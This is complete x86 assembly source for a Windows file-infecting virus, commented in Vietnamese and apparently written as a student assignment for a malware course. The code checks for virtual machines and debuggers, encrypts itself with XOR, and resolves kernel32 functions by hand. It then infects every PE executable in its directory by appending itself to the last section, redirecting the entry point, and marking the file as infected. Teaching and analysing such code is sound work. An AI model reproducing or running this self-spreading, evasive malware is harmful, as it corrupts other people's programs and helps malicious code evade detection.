.586
.model flat, stdcall

option casemap:none

.code

start:

virus segment
;======================================================================
;========================Khoi tao virus ban dau========================
;======================================================================

    ;Doan code chi dung de lay nhiem ban dau -> Ket thuc se goi call 0x00000000 -> crash
    ;-> Khong can quan tam
    mov     eax, offset Encrypt_End - offset Encrypt_Start
    mov     esi, offset CryptSize
    mov     dword ptr [esi], eax

    mov     eax, offset Virus_End - offset Virus_Start
    mov     esi, offset VirusSize
    mov     dword ptr [esi], eax

    mov     ebp, 0
    mov     esi, offset Encrypt_Start
    call    Cryptor
    
;Source code cua Virus
Virus_Start:
    ;Dung ky thuat Delta
    call    Delta
    Delta:
    pop     ebp
    sub     ebp, offset Delta

    ;Anti-VM
    xor     eax, eax
    inc     eax
    cpuid
    bt      ecx, 1Fh
    jb      GotoOEP

    ;Anti-Debug
    ASSUME  FS:Nothing
    mov     eax, fs:[030h]
    ASSUME  FS:ERROR
    cmp     dword ptr [eax + 068h], 070h
    jz      GotoOEP

    lea     esi, [ebp + Encrypt_Start]
    call    Cryptor

    jmp     Encrypt_Start

GotoOEP:
    call    dword ptr [ebp + RecoveryOEP]

;======================================================================
;===============================Cryptor================================
;======================================================================
;Bo ma hoa + giai ma; Thuat toan: byte[i] = byte[i] XOR Key
;Doan ma duoi day chi de "lam roi"
;byte[i] = byte[i] XOR byte[i - 1] XOR (byte[i - 1] XOR X XOR Y) = byte[i] XOR X XOR Y = byte[i] XOR Z 
Cryptor:
    xor     eax, eax
    mov     eax, 012345678h; Init Key = 56h XOR 78h = 2eh 
    mov     ecx, dword ptr [ebp + CryptSize]

Cryptor_Loop:
    mov     dl, byte ptr [esi]
    xor     byte ptr [esi], al
    xor     byte ptr [esi], ah
    mov     al, dl
    mov     ah, byte ptr [esi]
    add     esi, 1
    loop    Cryptor_Loop
    ret

;Bat dau vung code se duoc ma hoa
Encrypt_Start:
    mov     esi, [esp]
    and     esi, 0FFFF0000h
    call    GetK32
    jmp     MAIN

;======================================================================
;================================GetK32================================
;======================================================================
GetK32:
@_1:
    cmp     byte ptr [ebp + K32_Limit], 00h
    jz      Fail

    cmp     word ptr [esi],"ZM"
    jz      Check_PE

@_2:
    sub     esi, 10000h
    dec     byte ptr [ebp + K32_Limit]
    jmp     @_1

Check_PE:
    mov     edi, [esi + 3Ch]
    add     edi, esi
    cmp     dword ptr [edi], "EP"
    jz      Success
    jmp     @_2

Fail:
    mov     esi, 0BFF70000h

Success:
    xchg    eax, esi
    ret

MAIN:
    ;Lay Offset RVAExport, Export, AddressTableVA, NameTableVA, OrdinalTableVA, Counter
    mov     dword ptr [ebp + BaseOffset], eax
    mov     edi, eax
    mov     edi, [edi + 3ch]
    add     edi , 78h
    add     edi, [ebp + BaseOffset]
    mov     dword ptr [ebp + RVAExport], edi
    mov     edi, [edi]
    add     edi, [ebp + BaseOffset]
    mov     dword ptr [ebp + Export], edi
    mov     esi, edi
    add     esi, 1Ch
    LODSD
    add     eax, dword ptr [ebp + BaseOffset]
    mov     dword ptr [ebp + AddressTableVA], eax
    LODSD
    add     eax, dword ptr [ebp + BaseOffset]
    mov     dword ptr [ebp + NameTableVA], eax
    LODSD
    add     eax, dword ptr [ebp + BaseOffset]
    mov     dword ptr [ebp + OrdinalTableVA], eax
    xor     eax, eax
    mov     dword ptr [ebp + Counter], eax

    ;Lay cac API can thiet da khai bao tai @@Namez -> Luu offset vao @@Offsetz
    lea     edi, [ebp + @@Offsetz]
    lea     esi, [ebp + @@Namez]
    call    GetAPIs

    ;Lay cac API LoadLibrary, GetProcAddress, MessageBoxA
    lea     esi, [ebp + swUser32dll]
    push    esi
    call    [ebp + _LoadLibrary]

    lea     esi, [ebp + swMessageBoxA]
    push    esi
    push    eax
    call    [ebp + _GetProcAddress]
    mov     [ebp + _MessageBoxA], eax

    ;Hien thi MessageBox theo yeu cau
    push    0
    lea     esi, [ebp + msgTitle]
    push    esi
    lea     esi, [ebp + msgContent]
    push    esi
    push    0
    call    [ebp + _MessageBoxA]

    ;Tao mot vung nho de luu chinh Virus + Ma hoa
    push    ebp
    mov     eax, dword ptr [ebp + VirusSize]
    push    eax
    push    0h
    call    dword ptr [ebp + _GlobalAlloc]
    pop     ebp
    cmp     eax, 0h
    jz      GotoOEP
    mov     dword ptr [ebp + DynamicMemoryPTR], eax

    lea     esi, [ebp + Virus_Start]
    mov     edi, dword ptr [ebp + DynamicMemoryPTR]
    mov     ecx, dword ptr [ebp + VirusSize]

    rep     movsb   ;Dung rep movsb de thay the cho memcpy
    
    ;Ma hoa Virus vua duoc sao chep o tren
    mov     esi, dword ptr [ebp + DynamicMemoryPTR]
    mov     eax, offset Encrypt_Start - offset Virus_Start
    add     esi, eax
    call    Cryptor

    ;Tim file dau tien trong cung thu muc
    lea     eax, [ebp + FindData]
    push    eax
    lea     eax, [ebp + FilePath]
    push    eax
    call    dword ptr [ebp + _FindFirstFileA]
    mov     dword ptr [ebp + FindFileHandle], eax

CheckFile:
    cmp     dword ptr [ebp + FindData], 10h
    je      FindNextFile
    cmp     dword ptr [ebp + FindData], 20h
    jne     FindNextFile

    jmp     INFECT

FileClose:
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _CloseHandle]
    cmp     eax, 0
    je      FileClose

FindNextFile:
    lea     eax, [ebp + FindData]
    push    eax
    push    dword ptr [ebp + FindFileHandle]
    call    dword ptr [ebp + _FindNextFileA]
    cmp     eax, 0
    je      FindClose

    jmp     CheckFile

INFECT:
    push    0
    push    20h
    push    3
    push    0
    push    1
    push    0C0000000h
    lea     eax, [ebp + FindData + 44]
    push    eax
    call    dword ptr [ebp + _CreateFileA]
    cmp     eax, -1
    je      FindNextFile
    mov     dword ptr [ebp + FileHandle], eax

CheckPefile:
    push    0
    push    0
    push    0
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _SetFilePointer]

    ;Kiem tra "MZ"
    push    0
    push    0
    push    2
    lea     eax, [ebp + tempdw]
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _ReadFile]

    mov     ax, word ptr [ebp + tempdw]
    cmp     ax, 5a4dh
    jne     FileClose

    ;Kiem tra file da bi INFECT boi chinh virus nay chua
    ;0x40 la DOS Stub -> Doan chuong trinh canh bao khong thuc hien duoc tren DOS
    ;-> Gan nhu rat it duoc thuc thi
    ;-> Ghi de len 2 byte dau gia tri coi nhu la FLAG
    push    0
    push    0
    push    40h
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _SetFilePointer]

    push    0
    push    0
    push    2
    lea     eax, [ebp + tempdw]
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _ReadFile]

    mov     ax, word ptr [ebp + tempdw]
    cmp     ax, 06969h
    je      FileClose

    ;Lay offset PE(0x3C)
    push    0
    push    0
    push    3Ch
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _SetFilePointer]

    push    0
    push    0
    push    4
    lea     eax, [ebp + PEOffset]
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _ReadFile]

    ;Lay NumOfSections(PE + 0x6)
    push    0
    push    0
    mov     eax, dword ptr [ebp + PEOffset]
    add     eax, 6h
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _SetFilePointer]

    push    0
    push    0
    push    2
    mov     eax, offset NumOfSections
    add     eax, ebp
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _ReadFile]

    ;Tinh toan ImageBase + OEP -> OEP khoi phuc de quay lai chuc nang chinh cua chuong trinh
    push    0
    push    0
    mov     eax, dword ptr [ebp + PEOffset]
    add     eax, 28h
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _SetFilePointer]

    push    0
    push    0
    push    4
    lea     eax, [ebp + OEP]
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _ReadFile]

    push    0
    push    0
    mov     eax, dword ptr [ebp + PEOffset]
    add     eax, 34h
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _SetFilePointer]

    push    0
    push    0
    push    4
    lea     eax, [ebp + ImageBase]
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _ReadFile]
    mov     eax, dword ptr [ebp + OEP]
    mov     ecx, dword ptr [ebp + ImageBase]
    add     eax, ecx
    mov     dword ptr [ebp + tempdd], eax

    ;Ghi gia tri OEP khoi phuc vao buffer dung de sao chep
    mov     eax, offset RecoveryOEP - offset Virus_Start
    mov     esi, dword ptr [ebp + DynamicMemoryPTR]
    add     esi, eax
    mov     eax, dword ptr [ebp + tempdd]
    mov     dword ptr [esi], eax

    ;Tim offset section cuoi
    mov     ecx, dword ptr [ebp + NumOfSections]
    dec     ecx
    mov     eax, dword ptr [ebp + PEOffset]
    add     eax, 248 + 8

NextSection:
    add eax, 40
    loop NextSection

    push    0
    push    0
    push    eax
    push    dword ptr [FileHandle + ebp]
    call    dword ptr [_SetFilePointer + ebp]

    ;Lay thong tin ve section cuoi cung cua file
    push    0
    push    0
    push    32
    mov     eax, offset VirtualSize
    add     eax, ebp
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _ReadFile]
    mov     eax, dword ptr [ebp + RawSize]
    mov     dword ptr [ebp + oldRawSize], eax

    ;Sua thong tin Characteristics: CODE | INIT_DATA | UNINIT_DATA | MEM_NOT_PAGED | MEM_EXECUTE | MEM_READ | MEM_WRITE
    mov     [ebp + Characteristics], 0E80000E0h

    ;Tinh RawSize moi
    mov     eax, dword ptr [ebp + VirusSize]
    add     dword ptr [ebp + RawSize], eax

    ;VirtualSize = RawSize
    mov     eax, dword ptr [ebp + RawSize]
    mov     dword ptr [ebp + VirtualSize], eax

    ;Chinh lai thong tin section cuoi cung voi cac gia tri da thay doi o tren
    push    1
    push    0
    push    -32
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _SetFilePointer]

    push    0
    push    0
    push    32
    mov     eax, offset VirtualSize
    add     eax, ebp
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _WriteFile]

    ;Tinh toan Entry Point moi
    push    2
    push    0
    push    0
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _SetFilePointer]
    mov     dword ptr [ebp + hostSize], eax
    sub     eax, dword ptr [ebp + RawAddress]
    add     eax, dword ptr [ebp + VirtualAddress]
    mov     dword ptr [ebp + NewEP], eax

    ;Ghi vao cuoi Section cuoi cua file
    push    0
    push    0
    mov     eax, dword ptr [ebp + VirusSize]
    push    eax
    push    dword ptr [ebp + DynamicMemoryPTR]
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _WriteFile]

    ;Sua OEP thanh Entry Point moi
    push    0
    push    0
    mov     eax, dword ptr [ebp + PEOffset]
    add     eax, 28h
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _SetFilePointer]

    push    0
    push    0
    push    4
    mov     eax, offset NewEP
    add     eax, ebp
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _WriteFile]

    ;change SizeOfImage
    mov     eax, dword ptr [ebp + VirtualAddress]
    add     eax, dword ptr [ebp + VirtualSize]
    add     dword ptr [ebp + NewSizeOfImage], eax

    push    0
    push    0
    mov     eax, dword ptr [ebp +PEOffset]
    add     eax, 50h
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _SetFilePointer]

    push    0
    push    0
    push    4
    mov     eax, offset NewSizeOfImage
    add     eax, ebp
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _WriteFile]

    ;Gan FLAG 0x6969 vao DOS Stub -> File da bi lay nhiem
    push    0
    push    0
    push    40h
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _SetFilePointer]

    push    0
    push    0
    push    2
    mov     eax, offset FLAG
    add     eax, ebp
    push    eax
    push    dword ptr [ebp + FileHandle]
    call    dword ptr [ebp + _WriteFile]

    jmp     FileClose

FindClose:
    push    dword ptr [ebp + FindFileHandle]
    call    dword ptr [ebp + _FindClose]

GlobalFree:
    push    dword ptr [ebp + DynamicMemoryPTR]
    call    dword ptr [ebp + _GlobalFree]

    ;Khoi phuc lai OEP de thuc hien chuc nang chinh cua tep
    jmp     GotoOEP

;================================================
;====================GetAPI======================
;================================================
GetAPI         proc
    mov     edx, esi

__1:
    cmp     byte ptr [esi], 0
    jz      __2
    inc     esi
    jmp     __1

__2:
    inc     esi
    sub     esi, edx
    mov     ecx, esi

    xor     eax, eax
    mov     word ptr [ebp + Counter], ax
    mov     esi, dword ptr [ebp + NameTableVA]

__3:
    push    esi
    lodsd
    add     eax, dword ptr [ebp + BaseOffset]
    mov     esi, eax
    mov     edi, edx
    push    ecx
    cld
    repe    cmpsb
    pop     ecx
    jz      __4
    pop     esi
    add     esi, 4
    inc     word ptr [ebp + Counter]
    jmp     __3

__4:
    pop     esi
    movzx   eax, word ptr [ebp + Counter]
    shl     eax, 1
    add     eax, dword ptr [ebp + OrdinalTableVA]
    xor     esi, esi
    xchg    eax, esi
    lodsw
    shl     eax, 2
    add     eax, dword ptr [ebp + AddressTableVA]
    mov     esi, eax
    lodsd
    add     eax, dword ptr [ebp + BaseOffset]
    ret

GetAPI         endp

;================================================
;====================GetAPIs=====================
;================================================
GetAPIs        proc
__1:
    push    esi
    push    edi
    call    GetAPI
    pop     edi
    pop     esi
    stosd

__2:
    cmp     byte ptr [esi], 0
    jz      __3
    inc     esi
    jmp     __2

__3:
    cmp     byte ptr [esi + 1], 0FFh
    jz      __4
    inc     esi
    jmp     __1

__4:
    ret

GetAPIs        endp

;================================================
;=====================DATA=======================
;================================================
@@Namez                 label   byte
@GetProcAddress         db      "GetProcAddress",0
@LoadLibrary            db      "LoadLibraryA",0
@CloseHandle            db      "CloseHandle",0
@CreateFileA            db      "CreateFileA",0
@FindClose              db      "FindClose",0
@FindFirstFileA         db      "FindFirstFileA",0
@FindNextFileA          db      "FindNextFileA",0
@ReadFile               db      "ReadFile",0
@SetFilePointer         db      "SetFilePointer",0
@WriteFile              db      "WriteFile",0
@GlobalFree             db      "GlobalFree",0
@GlobalAlloc            db      "GlobalAlloc",0
                        db      0FFh

@@Offsetz               label   byte
_GetProcAddress         dd      00000000h
_LoadLibrary            dd      00000000h
_CloseHandle            dd      00000000h
_CreateFileA            dd      00000000h
_FindClose              dd      00000000h
_FindFirstFileA         dd      00000000h
_FindNextFileA          dd      00000000h
_ReadFile               dd      00000000h
_SetFilePointer         dd      00000000h
_WriteFile              dd      00000000h
_GlobalFree             dd      00000000h
_GlobalAlloc            dd      00000000h

_MessageBoxA            dd      00000000h

K32_Limit               dw      5
FileHandle              dd      ?
FilePath                db      ".\*.*", 50 dup(0)
FindFileHandle          dd      ?

msgTitle                db      "Lop Co Che Ma Doc cua Thay Duy dep trai!",0
msgContent              db      "Infected by 17520744-17520808-17520987",0

swUser32dll             db      "user32.dll",0
swMessageBoxA           db      "MessageBoxA",0

VirtualSize             dd      ?
VirtualAddress          dd      ?
RawSize                 dd      ?
RawAddress              dd      ?
Free                    db      12 dup(?)
Characteristics         dd      ?

DynamicMemoryPTR        dd      ?
hostSize                dd      ?
FLAG                    db      069h, 069h, 0
oldRawSize              dd      ?
NewEP                   dd      ?



PEOffset                dd      ?
NumOfSections           dd      ?
Counter                 dd      ?
BaseOffset              dd      ?
RVAExport               dd      ?
Export                  dd      ?
AddressTableVA          dd      ?
NameTableVA             dd      ?
OrdinalTableVA          dd      ?
NewSizeOfImage          dd      ?
ImageBase               dd      ?
OEP                     dd      ?
tempdw                  dw      ?
tempdd                  dd      ?
FindData                db      592 dup (?) ,0
VirusSize               dd      ?
;===============================================================================================
;Ket thuc vung code duoc ma hoa
Encrypt_End:

RecoveryOEP             dd      ?
CryptSize               dd      ?
;Ket thuc Virus
Virus_End:

virus ends
end start
